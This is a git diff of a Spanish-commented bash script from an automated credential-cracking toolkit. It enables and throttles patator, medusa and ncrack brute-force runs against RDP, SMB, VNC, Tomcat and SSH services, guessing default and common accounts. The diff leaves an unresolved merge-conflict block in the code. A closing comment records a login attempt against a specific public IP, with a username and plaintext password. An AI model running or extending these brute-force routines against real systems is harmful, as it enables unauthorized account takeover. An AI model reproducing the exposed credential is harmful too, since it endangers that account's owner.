@@ -11,9 +11,7 @@ RESET='\e[0m'
 
 # RDP crak
 
-#admin/admin, admin/password                       
-
-max_ins=10
+#admin/admin, admin/password                  
 
 echo -e "  ______                  _                         __   ______ "
 echo -e " / _____)                | |                       /  | / __   |"
@@ -33,6 +31,10 @@ while (( "$#" )); do
   case "$1" in
     --mode)
       MODE=$2 #hacking/total
+      shift 2
+      ;;
+	--speed) #1 -> lento /2-> medio /3-> rapido
+      SPEED=$2
       shift 2
       ;;
     --name)
@@ -84,9 +86,14 @@ MIN_RAM=900;
 MAX_SCRIPT_INSTANCES=100
 tomcat_passwords_combo="/usr/share/lanscanner/tomcat-passwds.txt"
 FILE_SUBDOMAINS="importarMaltego/subdominios-scan.csv"
+<<<<<<< HEAD
 ###############################
+=======
+MAX_SCRIPT_INSTANCES=10
+MIN_RAM=900
+>>>>>>> 6ff8b8c (update)
 
-echo "LENGUAJE $LENGUAJE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST VERBOSE:$VERBOSE"
+echo "LENGUAJE $LENGUAJE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST VERBOSE:$VERBOSE SPEED $SPEED"
 if [[ -z $LENGUAJE ]];then 
 
 cat << "EOF"
@@ -155,9 +162,7 @@ function insert_data () {
 	}
 
 
-
 find  servicios -size  0 -print0 |xargs -0 rm 2>/dev/null 
-
 echo "Revisar servicios "
 
 if [ -f servicios/rdp.txt ]; then	
@@ -167,19 +172,31 @@ if [ -f servicios/rdp.txt ]; then
 		port=`echo $line | cut -f2 -d":"`
 		waitWeb 0.5
 		echo -e "[+] Probando $ip:$port"
-		
-		####### user administrador/administrator ####
-		echo "admin_user $admin_user"
-		#patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_"$admin_user"-3389_passwordAdivinadoWin2.txt &
-		
-		##############################
 
-		if [[ ! -z $ENTIDAD ]] ;then	
-			####### user $ENTIDAD ####
-			echo ""
-			#patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED'  2>> logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt &		
-			##############################
-		fi
+		while true; do			
+			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
+			script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 			
+			
+			if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 					
+				####### user administrador/administrator ####
+				echo "admin_user $admin_user"
+				patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED|ERRCONNECT_TLS_CONNECT_FAILED' 2> logs/cracking/"$ip"_"$admin_user"-3389_passwordAdivinadoWin2.txt &
+				
+				##############################
+
+				if [[ ! -z $ENTIDAD ]] ;then	
+					####### user $ENTIDAD ####
+					echo ""
+					patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED|ERRCONNECT_TLS_CONNECT_FAILED'  2>> logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt &
+					##############################
+				fi			
+				break
+			else								
+				script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
+				echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
+				sleep 3										
+			fi		
+		done # while true
 
 	 done	
 	 insert_data
@@ -296,25 +313,37 @@ then
 		else
 			waitWeb 0.5
 			echo -e "[+] Probando $ip"
-			echo "patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt
-			patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE  2> logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt &
-
-			if [[ "$MODE" == "total" ]]; then 
-
-				if [ "$LENGUAJE" == "es" ]; then
-					echo "patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt " >> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
-					patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2>> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
+			while true; do			
+				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
+				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 			
+				
+				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
+					echo "patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt
+					patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE  2> logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 
 					
-					echo "patator smb_login host=$ip user=sistemas password=FILE0 0=passwords.txt " >> logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 
-					patator smb_login host=$ip user=sistemas password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2>> logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 
-				fi			
-			fi
+					if [[ "$MODE" == "total" ]]; then 
+						if [ "$LENGUAJE" == "es" ]; then
+							echo "patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt " >> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
+							patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2>> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
+							
+							echo "patator smb_login host=$ip user=sistemas password=FILE0 0=passwords.txt " >> logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 
+							patator smb_login host=$ip user=sistemas password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2>> logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 
+						fi			
+					fi
 
-			if [[ ! -z $ENTIDAD ]];then
-				echo "patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt
-				patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2> logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 
-			fi	
-		fi # no null session
+					if [[ ! -z $ENTIDAD ]];then
+						echo "patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt
+						patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE 2> logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 
+					fi	
+
+					break
+				else								
+					script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
+					echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
+					sleep 3										
+				fi		
+			done # while true			
+		fi # no null session		
 	done	
 fi
 
@@ -437,7 +466,6 @@ then
 			#echo "patator.py http_fuzz url="$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
 			patator.py http_fuzz --rate-limit=1 --threads=1 url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_"$port"_passwordDefecto.txt 2>> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt &
 		fi	
-
 
 
 		if [[ $fingerprint = *"wordpress"* ]]; then			
@@ -870,38 +898,30 @@ if [[ "$MODE" == "total" ]] ; then
 	fi
 
 
-	if [ -f servicios/informix.txt ]
-	then	
-		
-		echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
-		for line in $(cat servicios/informix.txt); do
+	if [ -f servicios/vnc.txt ]
+	then   	  
+		echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
+		for line in $(cat servicios/vnc.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
-			echo -e "\n\t########### $ip #######"			
-			echo -e "\t [+] Probando password por defecto (SFI)"
-			
-			echo -e "\n medusa -t 1 -f -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -t 1 -f -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			
-			echo -e "\n medusa -t 1 -f -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -t 1 -f -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			
-			echo -e "\n medusa -t 1 -f -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -t 1 -f -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			
-			echo -e "\n medusa -t 1 -f -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -t 1 -f -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			
-			echo -e "\n medusa -t 1 -f -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
-			medusa -t 1 -f -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
-			
-			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
-		done
-		insert_data	
-	fi
+			echo -e "\n\t########### $ip #######"
 
-
-fi #modo total/vulnerabilidades
+			while true; do			
+				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
+				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 							
+				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
+					ncrack --user "$admin_user" -P passwords.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+					echo ""				
+					break
+				else								
+					script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
+					echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
+					sleep 5									
+				fi		
+			done # while true
+		done #ip
+	fi #if
+fi #modo total
 
 #echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 #grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
@@ -922,6 +942,16 @@ done
 
 ############################## PARSE ############################
 
+if [ -f servicios/vnc.txt ]
+then
+    echo -e "$OKBLUE #################### PARSE (`wc -l servicios/vnc.txt`) ######################$RESET"	    
+	 for line in $(cat servicios/vnc.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`	
+		echo -e "[+] Parse $ip:$port"	
+		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+	done
+fi	
 
 if [ -f servicios/postgres.txt ]
 then
@@ -1211,51 +1241,6 @@ fi
 # fi	
 
 
-# if [ -f servicios/vnc.txt ]
-# then   	  
-# 	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
-# 	  for line in $(cat servicios/vnc.txt); do
-# 		ip=`echo $line | cut -f1 -d":"`
-# 		port=`echo $line | cut -f2 -d":"`
-# 		echo -e "\n\t########### $ip #######"					
-# 		ncrack_instances=`pgrep ncrack | wc -l`
-# 		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
-# 		then
-# 			ncrack --user "$admin_user" -P passwords.txt-p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
-# 			echo ""		
-# 		else
-# 			echo "Max instancias de ncrack ($max_ins)"
-# 			sleep 10;
-				
-# 		fi		
-		
-# 	  done
-	  
-# 	  sleep 5
-# 	  ### wait to finish
-# 	  while true; do
-# 		ncrack_instances=`pgrep ncrack | wc -l`
-# 		if [ "$ncrack_instances" -gt 0 ]
-# 		then
-# 			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
-# 			sleep 30
-# 		else
-# 			break		  		 
-# 		fi				
-# 	  done
-	
-# 	  echo -e "\n\t########### Checking success #######"	
-# 	  for line in $(cat servicios/vnc.txt); do
-# 		ip=`echo $line | cut -f1 -d":"`
-# 		port=`echo $line | cut -f2 -d":"`
-						
-# 		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
-# 		echo ""			
-# 	  done
-	 	 	 
-# 	 insert_data	
-# fi
-	
 
 #patator.py pop_login host=181.115.239.243 user=msanti password='Bichito$9'
 #17:20:24 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 17:20 EDT
